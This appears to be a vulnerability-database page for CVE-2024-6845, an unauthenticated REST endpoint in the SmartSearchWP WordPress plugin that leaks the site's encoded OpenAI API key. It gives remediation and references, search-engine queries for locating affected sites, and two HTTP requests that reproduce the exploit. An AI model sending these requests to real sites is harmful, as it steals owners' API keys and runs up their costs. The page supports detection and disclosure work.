---
layout: post
cve_id: CVE-2024-6845
title: SmartSearchWP < 2.4.6 - OpenAI Key Disclosure
pcap: true
pcap_path: /pcaps/2024/CVE-2024-6845.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6845.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: medium
impact: 'Unauthenticated attackers can retrieve and decode the OpenAI API key through
  an unsecured REST endpoint, potentially incurring API usage costs and data exposure.

  '
remediation: 'Update SmartSearchWP plugin to version 2.4.6 or later to address the
  API key disclosure vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/cfaaa843-d89e-42d4-90d9-988293499d26/
- https://nvd.nist.gov/vuln/detail/CVE-2024-6845
classification:
  epss-score: 0.17508
  epss-percentile: 0.94859
metadata:
  max-request: 2
  verified: true
  vendor: webdigit
  product: smartsearchwp
  framework: wordpress
  publicwww-query: /wp-content/plugins/smartsearchwp
  fofa-query: body="/wp-content/plugins/smartsearchwp"
tags:
- cve
- cve2024
- exposure
- wp
- wordpress
- wp-plugin
- smartsearchwp
- vuln
---

## ðŸ” Vulnerability Description
The plugin does not have proper authorization in one of its REST endpoint, allowing unauthenticated users to retrieve the encoded key and then decode it, thereby leaking the OpenAI API key.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-json/wdgpt/v1/api-key HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15
Connection: close
Content-Length: 23
Content-Type: application/json
Accept-Encoding: gzip
{"key": "U2FsdGVkX1+X"}
```

